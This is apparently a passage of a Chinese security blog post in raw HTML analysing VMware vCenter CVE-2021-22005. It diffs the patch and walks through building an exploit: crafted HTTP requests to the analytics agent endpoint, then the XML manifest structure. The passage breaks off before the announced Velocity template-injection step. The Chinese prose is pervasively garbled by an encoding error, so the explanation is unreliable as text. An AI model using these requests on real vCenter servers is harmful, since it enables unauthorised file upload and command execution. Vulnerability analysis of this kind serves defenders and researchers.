class="hljs-regexp">/vmware/</span>common-jars<span class="hljs-regexp">/spring-webmvc-4.3.27.RELEASE.jar:/u</span>sr<span class="hljs-regexp">/lib/</span>vmware<span class="hljs-regexp">/common-jars/</span>velocity-<span class="hljs-number">1.7</span>.jar com.vmware.ph.phservice.service.Main ph-properties-loader.xml ph-featurestate.xml phservice.xml ph-web.xml<br></code></pre></td></tr></table></figure><h2 id="2ã€è¡¥ä¸åˆ†æ"><a href="#2ã€è¡¥ä¸åˆ†æ" class="headerlink" title="2ã€è¡¥ä¸åˆ†æ"></a>2ã€è¡¥ä¸åˆ†æ</h2><p>vmwareåœ¨9æœˆ24æ—¥å‘å¸ƒäº†<a href="https://www.vmware.com/security/advisories/VMSA-2021-0020.html">å®‰å…¨é€šå‘Š</a>ï¼Œä¿®å¤äº†vcenterçš„å¤šä¸ªæ¼æ´ï¼Œå…¶ä¸­CVE-2021-22005 ä»»æ„æ–‡ä»¶ä¸Šä¼ è·å¾—ä¸¥é‡æ¼æ´ 9.8è¯„åˆ†ï¼Œé€šè¿‡æè¿°çœ‹åˆ°ï¼Œæ”»å‡»è€…å¯ä»¥æœªæˆæƒè¯·æ±‚443ç«¯å£ä¸Šä¼ æ–‡ä»¶ã€‚ä¸”æ­¤æ¼æ´å¹¶ä¸å½±å“vcenter 6.5 </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/4.png"></p><p>å¯ä»¥çœ‹åˆ°æ¼æ´å…³é”®å­—ï¼šAnalytics serviceã€443ç«¯å£è®¿é—®ã€æ–‡ä»¶ä¸Šä¼ æ‰§è¡Œå‘½ä»¤ã€ä¸å½±å“6.5</p><p>è¡¥ä¸æ–‡ç« ï¼š<a href="https://kb.vmware.com/s/article/85717">https://kb.vmware.com/s/article/85717</a></p><p>å¯¹æ¯”ä»£ç ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">17028579</span>\vmware-analytics<br><span class="hljs-attribute">6</span>.<span class="hljs-number">7</span>\<span class="hljs-number">18485185</span>-new\vmware-analytics<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/5.png"></p><p><code>analytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class</code></p><p>åˆ é™¤äº†DataAppAgentController.classçš„collect()æ–¹æ³•</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/6.png"></p><p>æŸ¥çœ‹å­˜åœ¨æ¼æ´çš„ç‰ˆæœ¬ä»£ç ï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/7.png"></p><p>å¦å¤–è¡¥ä¸è¿˜åœ¨å®ä¾‹åŒ–DataAppAgentIdç±»æ—¶ï¼Œä½¿ç”¨isValidCollectorIdåŠisValidCollectorInstanceIdæ£€æŸ¥ä¼ å…¥çš„collectorIdåŠcollectorInstanceIdæ˜¯å¦ç¬¦åˆè¦æ±‚</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/8.png"></p><p>com.vmware.ph.phservice.common.internal.IdFormatUtil</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/9.png"></p><p>ä½¿ç”¨<code>java.util.regex.Pattern</code>å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œä¸ç¬¦åˆè¦æ±‚åˆ™æ— æ³•å®ä¾‹åŒ–DataAppAgentIdå¯¹è±¡ï¼›</p><p>å¦å¤–ä¸€æ®µå˜åŒ–ä»£ç ï¼Œå‘ç”Ÿåœ¨<code>analytics-push-telemetry-server-6.7.0.jar\com\vmware\ph\phservice\push\telemetry\server\AsyncTelemetryController.class</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/10.png"></p><p>å˜åŒ–ç‚¹ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">vmware-analytics\lib\sources\<span class="hljs-keyword">com</span>\vmware\ph\phservice\<span class="hljs-keyword">push</span>\telemetry\server\AsyncTelemetryController<span class="hljs-meta">#handleSendRequest()</span><br><br><span class="hljs-symbol">collectorInstanceId:</span><br>IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId)  æ­£åˆ™é™åˆ¶<br><br><span class="hljs-symbol">collectorId:</span><br>_collectorIdWhitelist.contains(collectorId)  ç™½åå•é™åˆ¶<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/11.png"></p><p>è¯¥æ¼æ´çš„ä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/12.png"></p><p>æœ¬æ–‡å¯¹<code>/analytics/ph/api/dataapp/agent?action=collect</code>æ¼æ´éƒ¨åˆ†è¿›è¡Œåˆ†æï¼ŒæŸ¥çœ‹rhttpproxyä»£ç†å…³äºanalyticsæœåŠ¡çš„è·¯ç”±(<code>/etc/vmware-rhttpproxy/endpoints.conf.d/analytics-proxy.conf</code>)ï¼š</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/13.png"></p><p>å…è®¸&#x2F;analyticsè®¿é—®ã€‚å…¶å®ç»è¿‡æµ‹è¯•ç‰ˆæœ¬vmware vcenter 6.7å¹¶ä¸éœ€è¦ä½¿ç”¨..;å»è®¿é—®æ¼æ´æ¥å£çš„</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/14.png"></p><h2 id="3ã€å‘½ä»¤æ‰§è¡Œ-æ•°æ®æ„é€ "><a href="#3ã€å‘½ä»¤æ‰§è¡Œ-æ•°æ®æ„é€ " class="headerlink" title="3ã€å‘½ä»¤æ‰§è¡Œ æ•°æ®æ„é€ "></a>3ã€å‘½ä»¤æ‰§è¡Œ æ•°æ®æ„é€ </h2><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/15.png"></p><h3 id="3-1-åˆ›å»ºagent"><a href="#3-1-åˆ›å»ºagent" class="headerlink" title="3.1 åˆ›å»ºagent"></a>3.1 åˆ›å»ºagent</h3><p>è¡¥ä¸åˆ é™¤çš„æ¼æ´æ–¹æ³•æ˜¯ï¼šanalytics-cloud-dataapp-server-6.7.0.jar\com\vmware\ph\phservice\cloud\dataapp\server\DataAppAgentController.class#collect()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/16.png"></p><p>æ„é€ åŸºç¡€æ•°æ®åŒ…æµ‹è¯•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">POST <span class="hljs-regexp">/analytics/</span>ph<span class="hljs-regexp">/api/</span>dataapp<span class="hljs-regexp">/agent?action=collect&amp;_c=abc&amp;_i=test HTTP/</span><span class="hljs-number">1.1</span><br>...<br>Content-Type: application/json<br>X-Deployment-Secret: abc<br>Content-Length: <span class="hljs-number">65</span><br><br>&#123;<span class="hljs-string">&quot;manifestContent&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;contextData&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;objectId&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>122è¡Œä¼šå»è°ƒç”¨<code>com.vmware.ph.phservice.cloud.dataapp.DefaultDataAppAgentManager#getAgent</code>è·å–agent</p><blockquote><p>ç³»ç»Ÿä¼šå»&#x2F;etc&#x2F;vmware-analytics&#x2F;agentså¯»æ‰¾ parameter[_c]+ header[X-Plugin-Type] + â€œ.propertiesâ€ æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æœªä¼ å…¥è¯·æ±‚å¤´X-Plugin-Typeï¼Œæ‰€ä»¥ä¼šå»å¯»æ‰¾&#x2F;etc&#x2F;vmware-analytics&#x2F;agents&#x2F;abc.propertiesæ–‡ä»¶</p></blockquote><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/17.png"></p><p>com.vmware.ph.phservice.cloud.dataapp.repository.FileSystemAgentRepository#get()</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/18.png"></p><p>ä½†æ˜¯<code>/etc/vmware-analytics/agents/abc.properties</code>å¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥æŠ¥â€œDid not find agent matching the provided parameters.â€çš„é”™è¯¯</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/19.png"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„vsphere_health.propertiesï¼Œä½†æ˜¯ä¸ºäº†å¤šä¸ªç‰ˆæœ¬çš„é€‚é…ï¼Œæˆ‘ä»¬æœ€å¥½é€‰æ‹©ä½¿ç”¨<code>com.vmware.ph.phservice.cloud.dataapp.server.DataAppAgentController#create()</code>å»åˆ›å»ºä¸€ä¸ª</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/20.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/21.png"></p><p>æ„é€ æ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/analytics/ph/api/dataapp/agent?_c=abc&amp;_i=test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.196<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Deployment-Secret</span><span class="hljs-punctuation">: </span>abc<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>249<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;manifestSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;objectType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;collectionTriggerDataNeeded&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;deploymentDataNeeded&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;resultNeeded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;signalCollectionCompleted&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;localManifestPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localPayloadPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;localObfuscationMapPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/22.png"></p><p>æˆåŠŸåˆ›å»ºabc.propertiesï¼Œç„¶åå†è°ƒç”¨collectè¯·æ±‚å°±æ­£å¸¸äº†</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/23.png"></p><p>ç½‘ä¸Šå¯¹è¯¥æ¼æ´çš„ç»å¤§å¤šæ•°åˆ†ææ–‡ç« éƒ½æ˜¯ç›´æ¥è·³åˆ°velocityæ¨¡æ¿æ³¨å…¥éƒ¨åˆ†ï¼Œå¹¶æ²¡æœ‰è®²è¿°å¦‚ä½•ä»0å»æ„å»ºä¸€ä¸ªEXPï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¸€æ­¥ä¸€æ­¥æ¥æ„é€ ä¸‹ã€‚å¼€å§‹æ‰§è¡Œcollect()æ“ä½œçš„æ˜¯åœ¨<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.DefaultCollectorDataAppAgent#collect()</code>. EXPåˆ†å‡ ä¸ªå…³é”®éƒ¨åˆ†å»è®²è§£ï¼Œä¾æ¬¡æ˜¯ï¼šåˆ›å»ºagentã€XMLæ•°æ®æ„é€ ã€Velocityæ¨¡æ¿æ³¨å…¥</p><h3 id="3-2-XMLæ•°æ®æ„é€ "><a href="#3-2-XMLæ•°æ®æ„é€ " class="headerlink" title="3.2 XMLæ•°æ®æ„é€ "></a>3.2 XMLæ•°æ®æ„é€ </h3><p>è§£æXMLè°ƒç”¨æ ˆï¼š</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">server</span>.DataAppAgentController<span class="hljs-meta">#collect </span><br>    collectedData = ((CollectorDataAppAgent)agent).collect(manifestContent, objectId, jsonLdContextData); <span class="hljs-comment">//æ–¹æ³•å‚æ•°ç”±POSTä¼ å…¥</span><br>com.vmware.ph.phservice.cloud.dataapp.<span class="hljs-keyword">internal</span>.collector.DefaultCollectorDataAppAgent<span class="hljs-meta">#collect  </span><br>    List&lt;CollectionSpec&gt; collectionSpecs = <span class="hljs-keyword">this</span>.createCollectionSpecs(<span class="hljs-keyword">this</span>._dataApp, objectIdToContextData, CollectionTriggerType.ON_DEMAND, inMemoryManifestContentProvider, inMemoryUploadStrategy, <span class="hljs-literal">true</span>);<br>    Collector collector = <span class="hljs-keyword">this</span>.createCollector(collectionSpecs, (CollectionSchedule)<span class="hljs-literal">null</span>, CollectionTriggerType.ON_DEMAND);<br><br>    outcome = collector.collect();<br></code></pre></td></tr></table></figure><p>ç€é‡å¯¹<code>collector.collect()</code>è¿›è¡Œåˆ†æï¼Œå®é™…å®Œæˆæ“ä½œçš„æ˜¯åœ¨ï¼šcom.vmware.ph.phservice.collector.internal.core.ConnectionClosingCollectorWrapper#collect()ä¸­</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/24.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/25.png"></p><p>è·Ÿå…¥collect()ï¼š<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collect() â€”&gt;com.vmware.ph.phservice.cloud.dataapp.internal.collector.SpecsCollector#collectAndSend()</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/26.png"></p><p>â€‹    è¿™ä¸ªæ–¹æ³•æœ‰ä¸¤æ­¥é‡è¦æ“ä½œï¼Œç¬¬ä¸€æ­¥æ ¹æ®xmlæ•°æ®æ„å»ºManifestå¯¹è±¡ã€‚ç¬¬äºŒæ­¥å¯¹manifestToExecuteè¿›è¡Œæ”¶é›†æ“ä½œã€‚å…ˆåˆ†æç¬¬ä¸€æ­¥XMLæ„é€ </p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/27.png"></p><h4 id="3-2-1-æ ¹æ®XMLæ•°æ®è¿˜åŸManifestå¯¹è±¡"><a href="#3-2-1-æ ¹æ®XMLæ•°æ®è¿˜åŸManifestå¯¹è±¡" class="headerlink" title="3.2.1 æ ¹æ®XMLæ•°æ®è¿˜åŸManifestå¯¹è±¡"></a>3.2.1 æ ¹æ®XMLæ•°æ®è¿˜åŸManifestå¯¹è±¡</h4><p>åœ¨<code>com.vmware.ph.phservice.cloud.dataapp.internal.collector.CollectionTriggerTypeManifestParser#getManifest()</code>æ–¹æ³•ä¸­ï¼Œæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„<code>manifestContent</code>å†…å®¹ï¼Œç³»ç»Ÿä½¿ç”¨ä¸åŒçš„è§£æå™¨ï¼ˆ<code>XmlManifestParserã€VsanHealthJsonManifestParserã€VsanPerformanceJsonManifestParser</code>ï¼‰å»è§£æ</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/28.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/29.png"></p><p>ç­›é€‰è§„åˆ™åœ¨è§£æå™¨ç±»çš„isApplicable()ä¸­</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#isApplicable</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanHealthJsonManifestParser<span class="hljs-selector-id">#isApplicable</span><span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.cloud</span><span class="hljs-selector-class">.dataapp</span><span class="hljs-selector-class">.vsan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.collector</span>.VsanPerformanceJsonManifestParser#isApplicable<br></code></pre></td></tr></table></figure><p>â€‹                                                                                                   <img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/30.png"> </p><p>æ¥ç€è°ƒç”¨è§£æå™¨çš„getManifest()ï¼Œå³<code>com.vmware.ph.phservice.collector.internal.manifest.xml.XmlManifestParser#getManifest()</code>ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­è§„å®šäº†å„ä¸ªæ ‡ç­¾å†…å®¹ï¼Œä¾æ¬¡ä¸ºï¼š<code>&lt;requestSchedules&gt;ã€&lt;request&gt;ã€&lt;cdfmapping&gt;</code></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public Manifest get<span class="hljs-constructor">Manifest(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">schedule</span>)</span> &#123;<br>   <span class="hljs-comment">//1ã€é™åˆ¶å¿…é¡»åŒ…å«&lt;requestSchedules&gt;</span><br>        Document manifestDoc = get<span class="hljs-constructor">ManifestDocForSchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_isLegacySchedulingSupported</span>)</span>;<br>        <span class="hljs-keyword">if</span> (manifestDoc<span class="hljs-operator"> == </span>null) &#123;<br>            return null;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            NamedQuery<span class="hljs-literal">[]</span> queries = parse<span class="hljs-constructor">Queries(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_requestParser</span>)</span>;<br>            NamedQuery<span class="hljs-literal">[]</span> queriesForSchedule = this.get<span class="hljs-constructor">NamedQueriesForSchedule(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">schedule</span>, <span class="hljs-params">queries</span>)</span>;<br>            <span class="hljs-comment">//2ã€é™åˆ¶&lt;request&gt;æ ‡ç­¾å¿…é¡»åŒ…å«ä¸€ä¸ª&lt;query&gt;æ ‡ç­¾</span><br>            <span class="hljs-keyword">if</span> (queriesForSchedule != null<span class="hljs-operator"> &amp;&amp; </span>queriesForSchedule.length != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//3ã€è§£æ&lt;cdfmapping&gt;æ ‡ç­¾ï¼Œè¿™ä¸ªæ˜¯éœ€è¦æ”¾payloadçš„æ ‡ç­¾</span><br>                NamedQueryResultSetMapping&lt;Payload20&gt; cdfNamedQueryMapping = get<span class="hljs-constructor">CdfNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_cdfMappingParser</span>)</span>;<br>                NamedQueryResultSetMapping&lt;File&gt; fileNamedQueryMapping = get<span class="hljs-constructor">FileNamedQueryMapping(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_fileMappingParser</span>)</span>;<br>                List&lt;ObfuscationRule&gt; obfuscationRules = parse<span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">manifestDoc</span>, <span class="hljs-params">this</span>.<span class="hljs-params">_obfuscationRulesParser</span>)</span>;<br>                <span class="hljs-built_in">int</span> recommendedPageSize = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">manifestDoc</span>, 5000)</span>;<br>                <br>                Manifest result = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Builder</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Queries(<span class="hljs-params">queriesForSchedule</span>)</span>.<span class="hljs-keyword">with</span><span class="hljs-constructor">CdfMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">cdfNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">FileMapping(<span class="hljs-params">getNonNullNamedQueryResultSetMapping</span>(<span class="hljs-params">fileNamedQueryMapping</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">ObfuscationRules(<span class="hljs-params">getNonNullObfuscationRules</span>(<span class="hljs-params">obfuscationRules</span>)</span>).<span class="hljs-keyword">with</span><span class="hljs-constructor">RecommendedPageSize(<span class="hljs-params">recommendedPageSize</span>)</span>.build<span class="hljs-literal">()</span>;<br>                return result;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                return null;<br>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>aã€æ„é€ <requestSchedules>æ ‡ç­¾</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static Document get<span class="hljs-constructor">ManifestDocForSchedule(String <span class="hljs-params">manifestStr</span>, CollectionSchedule <span class="hljs-params">collectionSchedule</span>, <span class="hljs-params">boolean</span> <span class="hljs-params">isLegacySchedulingSupported</span>)</span> &#123;<br>        boolean containsRequestScheduleSection = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>contains<span class="hljs-constructor">RequestScheduleSection(<span class="hljs-params">manifestStr</span>)</span>;<br>        Document manifestDocument;<br>        <span class="hljs-keyword">if</span> (containsRequestScheduleSection) &#123;<span class="hljs-comment">//å¿…é¡»åŒ…å«requestSchedulesæ ‡ç­¾</span><br>            manifestDocument = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XmlManifestUtils</span>.</span></span>get<span class="hljs-constructor">NonDailySection(<span class="hljs-params">manifestStr</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isLegacySchedulingSupported) &#123;<span class="hljs-comment">//é»˜è®¤false</span><br>            manifestDocument = get<span class="hljs-constructor">ManifestDocForLegacySchedule(<span class="hljs-params">manifestStr</span>, <span class="hljs-params">collectionSchedule</span>)</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            manifestDocument = null;<br>        &#125;<br>        return manifestDocument;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/31.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/32.png"></p><p><code>&lt;requestSchedules&gt;æ ‡ç­¾å¯¹åº”çš„ç±»æ˜¯ï¼šcom.vmware.ph.phservice.collector.internal.manifest.xml.scheduling.data.RequestScheduleSpec</code></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/33.png"></p><p>æ„é€ å®Œæˆ<requestSchedules>æ ‡ç­¾:<code>&lt;requestSchedules&gt;&lt;/requestSchedules&gt;</code></p><p>bã€æ„é€ <request>æ ‡ç­¾</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestParser<span class="hljs-selector-id">#parseQueries</span><br>com<span class="hljs-selector-class">.vmware</span><span class="hljs-selector-class">.ph</span><span class="hljs-selector-class">.phservice</span><span class="hljs-selector-class">.collector</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.manifest</span><span class="hljs-selector-class">.xml</span>.XmlManifestUtils#parseRequestSpec<br></code></pre></td></tr></table></figure><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/34.png"></p><p>è§£æ<request>æ ‡ç­¾çš„è§£æå™¨ï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.JaxbRequestSpecParser#parse</code>,é™åˆ¶äº†å¿…é¡»åŒ…å«<code>&lt;constraint&gt;</code>æ ‡ç­¾</p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/35.png"></p><p><img src="/img/Research-Vmware-Vcenter's-vulnerability-CVE-2021-22005/36.png"></p><p><request>æ ‡ç­¾å¯¹åº”çš„ç±»æ˜¯ï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.RequestSpec</code></p><p>â€‹                                                  <img src="/../../../../images/c3442871da035b4836c30ca52af6386b2b9a3944713588fd665b518b3c05dc94.png" alt="å›¾ 4">  </p><p>queryæ ‡ç­¾å¯¹åº”çš„ç±»æ˜¯ï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec</code></p><p>â€‹                                                <img src="/../../../../images/1f99ba2290974305704d0bbc37151205aa6709083d2fc0056eb8ca64bf8bcf45.png" alt="å›¾ 5">  </p><p>constraintæ ‡ç­¾å¯¹åº”çš„ç±»æ˜¯ï¼š<code>com.vmware.ph.phservice.collector.internal.manifest.xml.query.data.QuerySpec#QuerySpec()</code></p><p>â€‹                                             <img src="/../../../../images/1287bb7f2b34501c61cd57cf762cb7fe7662ad01f965afb0da35a130aa0ce4ce.png" alt="å›¾ 6">  </p><p>æ„é€ <request>æ ‡ç­¾ï¼š<code>&lt;request&gt;&lt;query&gt;&lt;constraint&gt;&lt;targetType&gt;xxx&lt;/targetType&gt;&lt;/constraint&gt;&lt;/query&gt;&lt;/request&gt;</code></p><p>cã€æ„é€ <cdfMapping>æ ‡ç­¾</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp">com.vmware.ph.phservice.collector.<span class="hljs-keyword">internal</span>.manifest.xml.XmlManifestUtils<span class="hljs-meta">#parseCdfMapping</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;I, O&gt; <span class="hljs-function">Mapping&lt;I, O&gt; <span class="hljs-title">parseCdfMapping</span>(<span class="hljs-params">Document manifestDoc, MappingParser mappingParser</span>)</span> &#123;<br><span class="hljs-keyword">return</span> parseMapping(manifestDoc, mappingParser, <span class="hljs-string">&quot;cdfMapping&quot;</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><cdfMapping>æ 